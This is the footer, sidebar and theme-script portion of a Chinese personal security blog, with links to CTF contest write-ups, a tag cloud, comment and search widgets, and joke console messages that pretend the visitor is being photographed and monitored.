"data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202405122143892.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2024广东大学生攻防大赛WP"/></a><div class="content"><a class="title" href="/posts/5b73.html" title="2024广东大学生攻防大赛WP">2024广东大学生攻防大赛WP</a><time datetime="2024-05-12T22:20:00.000Z" title="发表于 2024-05-13 06:20:00">2024-05-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/9cdd.html" title="obsidian remotely save同步失败问题处理(webdav)"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202405082021361.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="obsidian remotely save同步失败问题处理(webdav)"/></a><div class="content"><a class="title" href="/posts/9cdd.html" title="obsidian remotely save同步失败问题处理(webdav)">obsidian remotely save同步失败问题处理(webdav)</a><time datetime="2024-05-08T12:11:09.000Z" title="发表于 2024-05-08 20:11:09">2024-05-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/fb76.html" title="2022广东大学生攻防大赛WP"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202405050109637.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2022广东大学生攻防大赛WP"/></a><div class="content"><a class="title" href="/posts/fb76.html" title="2022广东大学生攻防大赛WP">2022广东大学生攻防大赛WP</a><time datetime="2024-05-04T17:09:40.000Z" title="发表于 2024-05-05 01:09:40">2024-05-05</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div id="footer_deal"><a class="deal_link" href="mailto:975025272@qq.com" title="email"><i class="anzhiyufont anzhiyu-icon-envelope"></i></a><img class="footer_mini_logo" title="返回顶部" alt="返回顶部" onclick="anzhiyu.scrollToDest(0, 500)" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202303232356277.png" size="50px"/><a class="deal_link" target="_blank" rel="noopener" href="https://github.com/hihopkc" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="博客框架为Hexo_v5.4.0" title="博客框架为Hexo_v5.4.0"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.1.5/img/badge/Frame-Hexo.svg" alt="博客框架为Hexo_v5.4.0"/></a><a class="github-badge" target="_blank" href="https://blog.anheyu.com/" style="margin-inline:5px" data-title="本站使用AnZhiYu主题" title="本站使用AnZhiYu主题"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.9/img/Theme-AnZhiYu-2E67D3.svg" alt="本站使用AnZhiYu主题"/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" data-title="本站项目由Github托管" title="本站项目由Github托管"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.1.5/img/badge/Source-Github.svg" alt="本站项目由Github托管"/></a><a class="github-badge" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" style="margin-inline:5px" data-title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@2.2.0/img/badge/Copyright-BY-NC-SA.svg" alt="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"/></a></p></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2023 - 2024 By <a class="footer-bar-link" href="/" title="hihopkc" target="_blank">hihopkc</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">153</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">29</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">35</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 归档</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><i class="anzhiyufont anzhiyu-icon-artstation faa-tada" style="font-size: 0.9em;"></i><span> 朋友圈</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/equipment/"><i class="anzhiyufont anzhiyu-icon-dice-d20 faa-tada" style="font-size: 0.9em;"></i><span> 我的装备</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/ChatGpt/" style="font-size: 0.88rem;">ChatGpt<sup>2</sup></a><a href="/tags/Java/" style="font-size: 0.88rem;">Java<sup>1</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>2</sup></a><a href="/tags/MSF/" style="font-size: 0.88rem;">MSF<sup>1</sup></a><a href="/tags/Navicat/" style="font-size: 0.88rem;">Navicat<sup>1</sup></a><a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">Web安全<sup>9</sup></a><a href="/tags/binwalk/" style="font-size: 0.88rem;">binwalk<sup>1</sup></a><a href="/tags/docker/" style="font-size: 0.88rem;">docker<sup>3</sup></a><a href="/tags/hash/" style="font-size: 0.88rem;">hash<sup>1</sup></a><a href="/tags/hydra/" style="font-size: 0.88rem;">hydra<sup>1</sup></a><a href="/tags/java/" style="font-size: 0.88rem;">java<sup>1</sup></a><a href="/tags/john/" style="font-size: 0.88rem;">john<sup>1</sup></a><a href="/tags/mysql/" style="font-size: 0.88rem;">mysql<sup>1</sup></a><a href="/tags/oracle/" style="font-size: 0.88rem;">oracle<sup>1</sup></a><a href="/tags/owasp/" style="font-size: 0.88rem;">owasp<sup>1</sup></a><a href="/tags/phpstudy/" style="font-size: 0.88rem;">phpstudy<sup>1</sup></a><a href="/tags/python/" style="font-size: 0.88rem;">python<sup>1</sup></a><a href="/tags/redis/" style="font-size: 0.88rem;">redis<sup>1</sup></a><a href="/tags/shiro/" style="font-size: 0.88rem;">shiro<sup>1</sup></a><a href="/tags/sql/" style="font-size: 0.88rem;">sql<sup>1</sup></a><a href="/tags/ssrf/" style="font-size: 0.88rem;">ssrf<sup>1</sup></a><a href="/tags/tomcat/" style="font-size: 0.88rem;">tomcat<sup>1</sup></a><a href="/tags/wpscan/" style="font-size: 0.88rem;">wpscan<sup>1</sup></a><a href="/tags/xss/" style="font-size: 0.88rem;">xss<sup>2</sup></a><a href="/tags/%E5%AE%B9%E5%99%A8/" style="font-size: 0.88rem;">容器<sup>1</sup></a><a href="/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/" style="font-size: 0.88rem;">弱口令<sup>1</sup></a><a href="/tags/%E6%8A%A4%E7%BD%91/" style="font-size: 0.88rem;">护网<sup>1</sup></a><a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 0.88rem;">数据库<sup>2</sup></a><a href="/tags/%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/" style="font-size: 0.88rem;">测试工具<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.0.8/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.4/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.cbd.int/pangu@4.0.7/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (true){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("02/18/2023 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `你好，欢迎你来到我的博客!`,
    `保持热爱，奔赴山海✨`,
    `
        
    ██╗  ██╗██╗██╗  ██╗ ██████╗ ██████╗ ██╗  ██╗ ██████╗
    ██║  ██║██║██║  ██║██╔═══██╗██╔══██╗██║ ██╔╝██╔════╝
    ███████║██║███████║██║   ██║██████╔╝█████╔╝ ██║     
    ██╔══██║██║██╔══██║██║   ██║██╔═══╝ ██╔═██╗ ██║     
    ██║  ██║██║██║  ██║╚██████╔╝██║     ██║  ██╗╚██████╗
    ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝  ╚═╝ ╚═════╝
        
    `,
    "已上线",
    dnum,
    "天",
    "©2023 By hihopkc V1.6.9",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小丑】.`, `Photo captured: `, `🤣👉🏻🤡`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小丑.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hihopkc 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.56.5/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
  const init = () => {
    twikoo.init(Object.assign({
      el: '#twikoo-wrap',
      envId: 'https://hihopkc.space/',
      region: '',
      onCommentLoaded: () => {
        anzhiyu.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      }
    }, null))
  }

  const loadTwikoo = () => {
    if (typeof twikoo === 'object') setTimeout(runFn,0)
    else getScript('https://cdn.cbd.int/twikoo@1.6.21/dist/twikoo.all.min.js').then(runFn)
  }

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://hihopkc.space/',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(res => {
      countELement.textContent = res[0].count
    }).catch(err => {
      console.error(err)
    })
  }

  const runFn = () => {
    init();
    
  }

  if ('Twikoo' === 'Twikoo' || !true) {
    if (true) anzhiyu.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else {
      loadTwikoo()
    }
  } else {
    window.loadOtherComment = loadTwikoo
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getComment = () => {
    const runTwikoo = () => {
      twikoo.getRecentComments({
        envId: 'https://hihopkc.space/',
        region: '',
        pageSize: 6,
        includeReply: true
      }).then(function (res) {
        const twikooArray = res.map(e => {
          return {
            'content': changeContent(e.comment),
            'avatar': e.avatar,
            'nick': e.nick,
            'url': e.url + '#' + e.id,
            'date': new Date(e.created).toISOString()
          }
        })

        saveToLocal.set('twikoo-newest-comments', JSON.stringify(twikooArray), 10/(60*24))
        generateHtml(twikooArray)
      }).catch(function (err) {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      })
    }

    if (typeof twikoo === 'object') {
      runTwikoo()
    } else {
      getScript('https://cdn.cbd.int/twikoo@1.6.21/dist/twikoo.all.min.js').then(runTwikoo)
    }
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'><div class='name'><span>${array[i].nick} </span></div></a>`
        }
        
        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom.innerHTML= result
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('twikoo-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script>var visitorMail = "visitor@anheyu.com";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><script type="text/javascript" src="/js/fps.js"></script><div id="fps"></div><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["meta[property=\"og:image\"]","meta[property=\"og:title\"]","meta[property=\"og:url\"]","meta[property=\"og:type\"]","meta[property=\"og:site_name\"]","meta[property=\"og:description\"]","head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"]):not([href="/music/"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>